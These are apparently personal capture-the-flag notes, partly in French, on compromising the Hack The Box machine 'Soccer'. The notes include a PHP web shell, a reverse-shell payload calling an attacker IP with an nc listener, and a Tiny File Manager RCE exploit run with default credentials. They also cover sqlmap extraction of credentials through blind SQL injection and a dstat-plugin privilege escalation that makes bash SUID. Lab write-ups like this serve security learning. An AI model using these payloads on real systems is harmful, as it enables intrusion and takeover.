\chapter{Soccer}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}

_nmap-std() {
    PORTS=$(sudo nmap --min-rate=1000 -T4 -p- "$1" | grep '^[0-9]' | cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//) ;
    echo "ports found: $PORTS";
    USER=$(whoami)
    sudo nmap -sVC -p$PORTS -oX nmap.xml "$1";
    sudo chown $USER nmap.xml
}

$ _nmap-std 10.10.11.194
ports found: 22,80,9091
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sat, 24 Dec 2022 12:29:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sat, 24 Dec 2022 12:29:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sat, 24 Dec 2022 12:29:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
\end{verbatim}

\subsection{http 80}

\begin{verbatim}
$ ffuf -u http://soccer.htb/FUZZ -w directory-list-2.3-medium.txt 

tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 27ms]

$ curl -i http://soccer.htb/tiny
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 24 Dec 2022 12:38:02 GMT
Content-Type: text/html
Content-Length: 178
Location: http://soccer.htb/tiny/
Connection: keep-alive

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>

$ curl -I http://soccer.htb/tiny/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 24 Dec 2022 12:38:23 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: filemanager=4srqm6b4lumnvl8554lf42kqeu; path=/
Expires: Sat, 26 Jul 1997 05:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache

http://soccer.htb/tiny/tinyfilemanager.php
\end{verbatim}

\url{https://github.com/prasathmani/tinyfilemanager/security/advisories/GHSA-w72h-v37j-rrwr}

\url{https://febinj.medium.com/tiny-file-manager-authenticated-rce-ad768d49fa0}

\url{https://github.com/febinrev/tinyfilemanager-2.4.3-exploit}

en essayant avec les default crédentials d'admin présent dans le fichier on se
log:

\begin{verbatim}
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
);
\end{verbatim}



\url{https://github.com/febinrev/tinyfilemanager-2.4.3-exploit}

\begin{verbatim}
$ python ./tiny_file_manager_exploit.py  http://soccer.htb/tiny/tinyfilemanager.php admin admin@123


CVE-2021-45010: Tiny File Manager <= 2.4.3 Authenticated RCE  Exploit.

Vulnerability discovered by Febin

Exploit Author: FEBIN

[+] Leak in the webroot direcory path to upload shell.
[+] WEBROOT found:  /var/www/html/tiny
[+] Trying to upload pwn_1551829439500737792.php to /var/www/html/tiny directory...
{"status":"error","info":"The specified folder for upload isn't writeable."}
[-] No Success response. Files does not seem to be uploaded successfully.
Exiting...
Exited.
\end{verbatim}

en fait on peut copier le script lui même dans uplaods. Par contre il faut
créer un sous repaertoire car sinon les fichiers sont clean
\begin{verbatim}
$ cat exploit.php
<?php system($_REQUEST['cmd']); ?>
$ curl http://soccer.htb/tiny/uploads/test/tinyfilemanager.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{verbatim}

en fait c'est un gros erzats d'un precedent pentester

je reset mais en fait non c'est jusrte que j'avais un linpeas dans le
\verb+/home/player+ 

mais l'exploit marche bien comme ca

\subsection{Foothold}

\subsubsection{www-data}
ls reverse shell passe avec
\begin{verbatim}
<?php
$sock=fsockopen("10.10.16.3",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>

$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.194 36822
python3 -c 'import pty; pty.spawn("/bin/bash")'

\end{verbatim}

de linpeas on a :
\begin{verbatim}
server {
        listen 80;
        listen [::]:80;
        server_name soc-player.soccer.htb;
        root /root/app/views;
        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }
}


From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/
\end{verbatim}

donc on  ne peut pas voir le code et les access bdd

sur le nouveau site on peut creer un compte et se connecter

dans les sources on a un script qui explique le port 9091

\begin{verbatim}
script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });
        
        function keyOne(e) {
            e.stopPropagation();
            if (e.keyCode === 13) {
                e.preventDefault();
                sendText();
            }
        }
        
        function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
        }
        }
        
        ws.onmessage = function (e) {
        append(e.data)
        }
        
        function append(msg) {
        let p = document.querySelector("p");
        // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
        // p.style.color = randomColor;
        p.textContent = msg
        }
    </script>
\end{verbatim}


Donc visiblement on a une blind injection SQL car quand on saisit:
\begin{verbatim}
83950 AND 1          => Ticket Exists
83950 AND 0          => Ticket Doesn't Exist
\end{verbatim}

\begin{verbatim}
$ sqlmap --technique=BT --data='{"id": "83950"}'  \
    --not-string="Ticket Doesn't Exist" -u ws://soc-player.soccer.htb:9091
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "83950 AND (SELECT 8183 FROM (SELECT(SLEEP(5)))qtSA)"}
---
[09:56:13] [INFO] the back-end DBMS is MySQL
\end{verbatim}

on trouve \verb+soccer_db+, \verb+accounts+ et au final
\begin{verbatim}
+------+-------------------+----------+----------------------+
| id   | email             | username | password             |
+------+-------------------+----------+----------------------+
| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
+------+-------------------+----------+----------------------+
\end{verbatim}



\subsubsection{player}
\begin{verbatim}
# linpeas
-rwsr-xr-x 1 root root 42K Nov 17 09:09 /usr/local/bin/doas

player@soccer:/etc$ find / -name doas.conf 2> /dev/null
/usr/local/etc/doas.conf
player@soccer:/etc$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
\end{verbatim}

egalement de linpeas
\begin{verbatim}
  Group player:
/usr/local/share/dstat
\end{verbatim}

on peut donc creer un plugin

\begin{verbatim}
player@soccer:/etc$ cat /usr/local/share/dstat/dstat_pwn.py
import os
os.system('chmod +s /usr/bin/bash')

$ doas -u root /usr/bin/dstat --pwn
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
Module dstat_pwn failed to load. (name 'dstat_plugin' is not defined)
None of the stats you selected are available.
player@soccer:/etc$ ls -l /usr/bin/bas
base32    base64    basename  bash      bashbug
player@soccer:/etc$ ls -l /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash
player@soccer:/etc$ bash -p
bash-5.0# id
uid=1001(player) gid=1001(player) euid=0(root) egid=0(root) groups=0(root),1001(player)

\end{verbatim}

\section{Theorie}


